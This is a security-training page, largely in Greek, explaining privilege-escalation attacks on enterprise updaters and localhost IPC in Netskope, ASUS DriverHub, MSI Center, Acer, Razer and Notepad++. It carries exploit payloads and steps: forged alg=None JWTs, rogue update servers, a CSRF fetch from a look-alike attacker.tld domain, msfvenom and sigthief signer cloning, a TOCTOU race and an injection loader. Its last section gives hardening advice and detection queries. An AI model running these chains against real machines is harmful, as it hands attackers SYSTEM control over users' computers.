# Κατάχρηση Enterprise Auto-Updaters και Προνομιακού IPC (π.χ., Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Αυτή η σελίδα γενικεύει μια κατηγορία Windows local privilege escalation αλυσίδων που βρέθηκαν σε enterprise endpoint agents και updaters οι οποίοι εκθέτουν μια χαμηλού τριβής επιφάνεια IPC και μια προνομιακή ροή ενημέρωσης. Ένα αντιπροσωπευτικό παράδειγμα είναι το Netskope Client for Windows < R129 (CVE-2025-0309), όπου ένας χρήστης με χαμηλά προνόμια μπορεί να εξαναγκάσει την enrollment σε έναν server ελεγχόμενο από τον επιτιθέμενο και στη συνέχεια να παραδώσει ένα κακόβουλο MSI που εγκαθιστά η υπηρεσία SYSTEM.

Κύριες ιδέες που μπορείτε να επαναχρησιμοποιήσετε ενάντια σε παρόμοια προϊόντα:
- Κατάχρηση του localhost IPC μιας προνομιακής υπηρεσίας για να εξαναγκάσετε re-enrollment ή reconfiguration σε έναν attacker server.
- Υλοποίηση των update endpoints του vendor, παράδοση ενός rogue Trusted Root CA, και κατεύθυνση του updater σε ένα κακόβουλο, "signed" πακέτο.
- Παράκαμψη αδύναμων ελέγχων signer (CN allow-lists), προαιρετικών flags digest, και χαλαρών MSI properties.
- Εάν το IPC είναι “encrypted”, παράγωγη του key/IV από machine identifiers αναγνώσιμους από όλους και αποθηκευμένους στο registry.
- Εάν η υπηρεσία περιορίζει τους callers με βάση το image path/process name, injext σε ένα allow-listed process ή spawn ένα τέτοιο suspended και bootstrap το DLL σας μέσω ενός minimal thread-context patch.

---
## 1) Εξαναγκασμός enrollment σε attacker server μέσω localhost IPC

Πολλοί agents περιλαμβάνουν μια user-mode UI διεργασία που επικοινωνεί με μια SYSTEM υπηρεσία μέσω localhost TCP χρησιμοποιώντας JSON.

Παρατηρήθηκε στο Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit flow:
1) Δημιουργήστε ένα JWT enrollment token των οποίων τα claims ελέγχουν το backend host (π.χ., AddonUrl). Χρησιμοποιήστε alg=None ώστε να μην απαιτείται υπογραφή.
2) Στείλτε το IPC μήνυμα που καλεί την provisioning εντολή με το JWT σας και το tenant name:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Η υπηρεσία αρχίζει να απευθύνεται στον rogue server σας για enrollment/config, π.χ.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Σημειώσεις:
- Εάν η επαλήθευση του καλούντος βασίζεται σε path/name, ξεκινήστε το αίτημα από ένα allow-listed vendor binary (βλέπε §4).

---
## 2) Hijacking the update channel to run code as SYSTEM

Μόλις ο client επικοινωνήσει με τον server σας, υλοποιήστε τα αναμενόμενα endpoints και κατευθύνετέ το προς ένα attacker MSI. Τυπική ακολουθία:

1) /v2/config/org/clientconfig → Επιστρέψτε JSON config με πολύ σύντομο updater interval, π.χ.:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Επιστρέφει ένα PEM CA πιστοποιητικό. Η υπηρεσία το εγκαθιστά στο Local Machine Trusted Root store.
3) /v2/checkupdate → Παρέχει metadata που δείχνει σε ένα malicious MSI και μια fake version.

Παράκαμψη κοινών ελέγχων που συναντώνται σε πραγματικά περιβάλλοντα:
- Signer CN allow-list: η υπηρεσία μπορεί να ελέγχει μόνο αν το Subject CN ισούται με “netSkope Inc” ή “Netskope, Inc.”. Η rogue CA σας μπορεί να εκδώσει ένα leaf με αυτό το CN και να υπογράψει το MSI.
- CERT_DIGEST property: συμπερίλαβε μια benign MSI ιδιότητα με όνομα CERT_DIGEST. Δεν υπάρχει επιβολή κατά την εγκατάσταση.
- Optional digest enforcement: flag στο config (π.χ., check_msi_digest=false) απενεργοποιεί την επιπλέον κρυπτογραφική επικύρωση.

Αποτέλεσμα: η SERVICE εγκαθιστά το MSI σας από
C:\ProgramData\Netskope\stAgent\data\*.msi
εκτελώντας αυθαίρετο κώδικα ως NT AUTHORITY\SYSTEM.

---
## 3) Forging encrypted IPC requests (when present)

Από το R127, η Netskope τύλιξε το IPC JSON σε πεδίο encryptData που μοιάζει με Base64. Reversing έδειξε AES με key/IV παραγόμενα από registry τιμές αναγνώσιμες από οποιονδήποτε χρήστη:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Οι επιτιθέμενοι μπορούν να αναπαράγουν την κρυπτογράφηση και να στείλουν έγκυρες κρυπτογραφημένες εντολές από έναν standard user. Γενική συμβουλή: αν ένας agent ξαφνικά «encrypts» το IPC του, ψάξτε για device IDs, product GUIDs, install IDs κάτω από HKLM ως material.

---
## 4) Bypassing IPC caller allow-lists (path/name checks)

Κάποιες υπηρεσίες προσπαθούν να αυθεντικοποιήσουν τον peer επιλύοντας το PID της TCP σύνδεσης και συγκρίνοντας το image path/name με allow-listed vendor binaries που βρίσκονται υπό Program Files (π.χ., stagentui.exe, bwansvc.exe, epdlp.exe).

Δύο πρακτικές παρακάμψεις:
- DLL injection σε ένα allow-listed process (π.χ., nsdiag.exe) και proxy IPC από μέσα του.
- Spawn ενός allow-listed binary suspended και bootstrap το proxy DLL σας χωρίς CreateRemoteThread (βλέπε §5) ώστε να ικανοποιηθούν οι κανόνες tamper που εφαρμόζει ο driver.

---
## 5) Tamper-protection friendly injection: suspended process + NtContinue patch

Τα προϊόντα συχνά συνοδεύονται από έναν minifilter/OB callbacks driver (π.χ., Stadrv) για να αφαιρούν επικίνδυνα rights από handles προς προστατευμένες διεργασίες:
- Process: αφαιρεί PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: περιορίζεται σε THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Ένας αξιόπιστος user-mode loader που σέβεται αυτούς τους περιορισμούς:
1) CreateProcess ενός vendor binary με CREATE_SUSPENDED.
2) Πάρε handles που εξακολουθείς να επιτρέπεται να έχεις: PROCESS_VM_WRITE | PROCESS_VM_OPERATION στο process, και ένα thread handle με THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (ή απλά THREAD_RESUME αν κάνεις patch σε κώδικα σε γνωστό RIP).
3) Επικάλυψε (overwrite) ntdll!NtContinue (ή άλλο early, guaranteed-mapped thunk) με ένα μικρό stub που καλεί LoadLibraryW στο path της DLL σου, και μετά επιστρέφει.
4) ResumeThread για να ενεργοποιήσει το stub in-process, φορτώνοντας την DLL σου.

Δεδομένου ότι δεν χρησιμοποίησες PROCESS_CREATE_THREAD ή PROCESS_SUSPEND_RESUME σε μια ήδη προστατευμένη διεργασία (την δημιούργησες), η πολιτική του driver ικανοποιείται.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) αυτοματοποιεί rogue CA, malicious MSI signing, και σερβίρει τα απαιτούμενα endpoints: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope είναι ένας custom IPC client που κατασκευάζει arbitrary (επιλογικά AES-encrypted) IPC μηνύματα και περιλαμβάνει το suspended-process injection ώστε να προέρχονται από ένα allow-listed binary.

## 7) Fast triage workflow for unknown updater/IPC surfaces

Όταν αντιμετωπίζεις έναν νέο endpoint agent ή ένα motherboard “helper” suite, μια γρήγορη διαδικασία αξιολόγησης συνήθως αρκεί για να καταλάβεις αν κοιτάς έναν υποσχόμενο privesc στόχο:

1) Enumerate loopback listeners and map them back to vendor processes:
```powershell
Get-NetTCPConnection -State Listen |
Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
Select-Object LocalAddress,LocalPort,OwningProcess,
@{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```
2) Απαρίθμηση υποψήφιων named pipes:
```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```
3) Εξαγωγή δεδομένων δρομολόγησης που στηρίζονται στο registry και χρησιμοποιούνται από plugin-based IPC servers:
```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
Select-Object PSChildName
```
4) Εξάγετε πρώτα τα ονόματα endpoint, τα JSON keys και τα command IDs από τον user-mode client. Packed Electron/.NET frontends συχνά leak το πλήρες schema:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
-Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```
Εάν ο στόχος αυθεντικοποιεί τους καλούντες μόνο βάσει PID, image path ή process name, θεωρήστε το αυτό ως απλό εμπόδιο και όχι ως όριο ασφαλείας: η έγχυση στον νόμιμο client ή η δημιουργία της σύνδεσης από μια allow-listed διεργασία συχνά αρκεί για να ικανοποιήσει τους ελέγχους του server. Για named pipes συγκεκριμένα, [this page about client impersonation and pipe abuse](named-pipe-client-impersonation.md) καλύπτει το primitive με μεγαλύτερο βάθος.

---
## 1) Browser-to-localhost CSRF against privileged HTTP APIs (ASUS DriverHub)

DriverHub περιλαμβάνει μια user-mode HTTP υπηρεσία (ADU.exe) στο 127.0.0.1:53000 που αναμένει κλήσεις από browser που προέρχονται από https://driverhub.asus.com. Το φίλτρο Origin απλά εκτελεί `string_contains(".asus.com")` πάνω στην κεφαλίδα Origin και στα download URLs που αποκαλύπτονται από το `/asus/v1.0/*`. Οποιοσδήποτε host υπό έλεγχο του attacker, όπως το `https://driverhub.asus.com.attacker.tld`, επομένως περνάει τον έλεγχο και μπορεί να εκτελέσει state-changing requests από JavaScript. Δείτε [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) για επιπλέον bypass patterns.

Practical flow:
1) Καταχωρήστε ένα domain που ενσωματώνει `.asus.com` και φιλοξενήστε εκεί μια κακόβουλη σελίδα.
2) Χρησιμοποιήστε `fetch` ή XHR για να καλέσετε ένα privileged endpoint (π.χ., `Reboot`, `UpdateApp`) στο `http://127.0.0.1:53000`.
3) Στείλτε το JSON body που αναμένει ο handler – το packed frontend JS δείχνει το schema παρακάτω.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Ακόμη και το PowerShell CLI που φαίνεται παρακάτω επιτυγχάνει όταν το Origin header πλαστογραφηθεί στην αξιόπιστη τιμή:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Οποιαδήποτε επίσκεψη προγράμματος περιήγησης στον attacker site γίνεται επομένως ένα 1-click (ή 0-click μέσω `onload`) τοπικό CSRF που ενεργοποιεί έναν SYSTEM helper.

---
## 2) Ανασφαλής επαλήθευση ψηφιακής υπογραφής κώδικα & κλωνοποίηση πιστοποιητικού (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` κατεβάζει αυθαίρετα εκτελέσιμα που ορίζονται στο JSON body και τα cacheάρει σε `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Η επαλήθευση του Download URL ξαναχρησιμοποιεί την ίδια λογική substring, έτσι το `http://updates.asus.com.attacker.tld:8000/payload.exe` γίνεται αποδεκτό. Μετά το κατέβασμα, το ADU.exe απλώς ελέγχει ότι το PE περιέχει υπογραφή και ότι το Subject string ταιριάζει με ASUS πριν το τρέξει – χωρίς `WinVerifyTrust`, χωρίς επαλήθευση αλυσίδας.

Για να εκμεταλλευτείτε τη ροή:
1) Δημιουργήστε ένα payload (π.χ., `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Κλωνοποιήστε τον signer της ASUS μέσα σε αυτό (π.χ., `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Φιλοξενήστε το `pwn.exe` σε ένα domain που μοιάζει με `.asus.com` και ενεργοποιήστε το UpdateApp μέσω του browser CSRF παραπάνω.

Επειδή τόσο τα φίλτρα Origin και URL βασίζονται σε substring και ο έλεγχος του signer συγκρίνει μόνο strings, το DriverHub τραβάει και εκτελεί το attacker binary υπό το αυξημένο του context.

---
## 1) TOCTOU μέσα σε μονοπάτια αντιγραφής/εκτέλεσης του updater (MSI Center CMD_AutoUpdateSDK)

Η SYSTEM υπηρεσία του MSI Center εκθέτει ένα TCP πρωτόκολλο όπου κάθε frame είναι `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. Το βασικό component (Component ID `0f 27 00 00`) περιλαμβάνει `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Ο χειριστής του:
1) Αντιγράφει το προμηθευμένο εκτελέσιμο σε `C:\Windows\Temp\MSI Center SDK.exe`.
2) Επαληθεύει την υπογραφή μέσω `CS_CommonAPI.EX_CA::Verify` (το certificate subject πρέπει να ισούται με “MICRO-STAR INTERNATIONAL CO., LTD.” και το `WinVerifyTrust` να περάσει).
3) Δημιουργεί ένα scheduled task που τρέχει το temp αρχείο ως SYSTEM με arguments ελεγχόμενα από attacker.

Το αντιγραμμένο αρχείο δεν κλειδώνεται μεταξύ της επαλήθευσης και του `ExecuteTask()`. Ένας attacker μπορεί:
- Στείλει Frame A που δείχνει σε ένα νόμιμο MSI-signed binary (εγγυάται ότι ο έλεγχος υπογραφής περνάει και το task προωθείται σε ουρά).
- Αντιπαρατεθεί με επαναλαμβανόμενα Frame B μηνύματα που δείχνουν σε κακόβουλο payload, αντικαθιστώντας το `MSI Center SDK.exe` αμέσως μετά την ολοκλήρωση της επαλήθευσης.

Όταν πυροδοτήσει ο scheduler, εκτελεί το αντικατασταθέν payload ως SYSTEM παρά το γεγονός ότι είχε επικυρώσει το αρχικό αρχείο. Αξιόπιστη εκμετάλλευση χρησιμοποιεί δύο goroutines/threads που σπαμάρουν CMD_AutoUpdateSDK μέχρι να κερδηθεί το TOCTOU παράθυρο.

---
## 2) Κατάχρηση custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- Κάθε plugin/DLL που φορτώνεται από `MSI.CentralServer.exe` λαμβάνει ένα Component ID που αποθηκεύεται κάτω από `HKLM\SOFTWARE\MSI\MSI_CentralServer`. Τα πρώτα 4 bytes ενός frame επιλέγουν αυτό το component, επιτρέποντας σε attackers να δρομολογούν εντολές σε αυθαίρετα modules.
- Τα plugins μπορούν να ορίσουν δικούς τους task runners. Το `Support\API_Support.dll` εκθέτει `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` και καλεί απευθείας το `API_Support.EX_Task::ExecuteTask()` χωρίς **επαλήθευση υπογραφής** – οποιοσδήποτε τοπικός χρήστης μπορεί να το δείξει σε `C:\Users\<user>\Desktop\payload.exe` και να πάρει εκτέλεση ως SYSTEM με βεβαιότητα.
- Το sniffing του loopback με Wireshark ή η instrumentation των .NET binaries στο dnSpy αποκαλύπτει γρήγορα το mapping Component ↔ command· custom Go/ Python clients μπορούν στη συνέχεια να επαναπαίξουν frames.

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) εκθέτει `\\.\pipe\treadstone_service_LightMode`, και το discretionary ACL του επιτρέπει remote clients (π.χ., `\\TARGET\pipe\treadstone_service_LightMode`). Η αποστολή command ID `7` με ένα file path καλεί τη διαδικασία spawn του service.
- Η client library σειριοποιεί ένα magic terminator byte (113) μαζί με τα args. Dynamic instrumentation με Frida/`TsDotNetLib` (see [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) for instrumentation tips) δείχνει ότι ο native handler αντιστοιχίζει αυτή την τιμή σε `SECURITY_IMPERSONATION_LEVEL` και integrity SID πριν καλέσει το `CreateProcessAsUser`.
- Η αντικατάσταση του 113 (`0x71`) με 114 (`0x72`) οδηγεί στο γενικό branch που διατηρεί ολόκληρο το SYSTEM token και θέτει ένα high-integrity SID (`S-1-16-12288`). Το spawned binary εκτελείται επομένως ως ανεμπόδιστο SYSTEM, τόσο τοπικά όσο και cross-machine.
- Συνδυάστε αυτό με το εκτεθειμένο installer flag (`Setup.exe -nocheck`) για να στήσετε το ACC ακόμη και σε lab VMs και να δοκιμάσετε το pipe χωρίς εξοπλισμό vendor.

Αυτά τα IPC bugs αναδεικνύουν γιατί οι localhost υπηρεσίες πρέπει να επιβάλλουν αμοιβαία authentication (ALPC SIDs, `ImpersonationLevel=Impersonation` φίλτρα, token filtering) και γιατί κάθε module helper που «τρέχει αυθαίρετο binary» πρέπει να μοιράζεται τους ίδιους signer ελέγχους.

---
## 3) COM/IPC “elevator” helpers υποστηριζόμενοι από αδύναμη user-mode επαλήθευση (Razer Synapse 4)

Το Razer Synapse 4 πρόσθεσε ένα ακόμη χρήσιμο pattern σε αυτή την οικογένεια: ένας χρήστης με χαμηλά προνόμια μπορεί να ζητήσει από ένα COM helper να εκκινήσει μια διεργασία μέσω του `RzUtility.Elevator`, ενώ η απόφαση εμπιστοσύνης ανατίθεται σε ένα user-mode DLL (`simple_service.dll`) αντί να επιβάλλεται με ασφάλεια μέσα στα προνόμια του privileged boundary.

Παρατηρημένη διαδρομή εκμετάλλευσης:
- Δημιουργήστε το COM αντικείμενο `RzUtility.Elevator`.
- Καλέστε `LaunchProcessNoWait(<path>, "", 1)` για να ζητήσετε elevated launch.
- Στο δημόσιο PoC, η πύλη PE-signature μέσα στο `simple_service.dll` έχει patched out πριν την αποστολή του αιτήματος, επιτρέποντας την εκκίνηση οποιουδήποτε εκτελέσιμου που επιλέγει ο attacker.

Ελάχιστη κλήση PowerShell:
```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```
General takeaway: when reversing “helper” suites, do not stop at localhost TCP or named pipes. Check for κλάσεις COM with names such as `Elevator`, `Launcher`, `Updater`, or `Utility`, then verify whether the privileged service actually validates the target binary itself or merely trusts a result computed by a patchable user-mode client DLL. This pattern generalizes beyond Razer: any split design where the high-privilege broker consumes an allow/deny decision from the low-privilege side is a candidate privesc surface.

---
## Remote supply-chain hijack via weak updater validation (WinGUp / Notepad++)

Older WinGUp-based Notepad++ updaters did not fully verify update authenticity. When attackers compromised the hosting provider for the update server, they could tamper with the XML manifest and redirect only chosen clients to attacker URLs. Because the client accepted any HTTPS response without enforcing both a trusted certificate chain and a valid PE signature, victims fetched and executed a Trojanized NSIS `update.exe`.

Operational flow (no local exploit required):
1. **Infrastructure interception**: compromise CDN/hosting and answer update checks with attacker metadata pointing at a malicious download URL.
2. **Trojanized NSIS**: the installer fetches/executes a payload and abuses two execution chains:
- **Bring-your-own signed binary + sideload**: bundle the signed Bitdefender `BluetoothService.exe` and drop a malicious `log.dll` in its search path. When the signed binary runs, Windows sideloads `log.dll`, which decrypts and reflectively loads the Chrysalis backdoor (Warbird-protected + API hashing to hinder static detection).
- **Scripted shellcode injection**: NSIS executes a compiled Lua script that uses Win32 APIs (e.g., `EnumWindowStationsW`) to inject shellcode and stage Cobalt Strike Beacon.

Hardening/detection takeaways for any auto-updater:
- Enforce **certificate + signature verification** of the downloaded installer (pin vendor signer, reject mismatched CN/chain) and sign the update manifest itself (e.g., XMLDSig). Block manifest-controlled redirects unless validated.
- Treat **BYO signed binary sideloading** as a post-download detection pivot: alert when a signed vendor EXE loads a DLL name from outside its canonical install path (e.g., Bitdefender loading `log.dll` from Temp/Downloads) and when an updater drops/executes installers from temp with non-vendor signatures.
- Monitor **malware-specific artifacts** observed in this chain (useful as generic pivots): mutex `Global\Jdhfv_1.0.1`, anomalous `gup.exe` writes to `%TEMP%`, and Lua-driven shellcode injection stages.

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> εκκινεί έναν εγκαταστάτη που δεν είναι Notepad++</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

Αυτά τα μοτίβα γενικεύονται σε οποιονδήποτε updater που αποδέχεται unsigned manifests ή αποτυγχάνει να pin installer signers—network hijack + malicious installer + BYO-signed sideloading οδηγεί σε remote code execution υπό το πρόσχημα των “trusted” updates.

---
## Αναφορές
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)

{{#include ../../banners/hacktricks-training.md}}
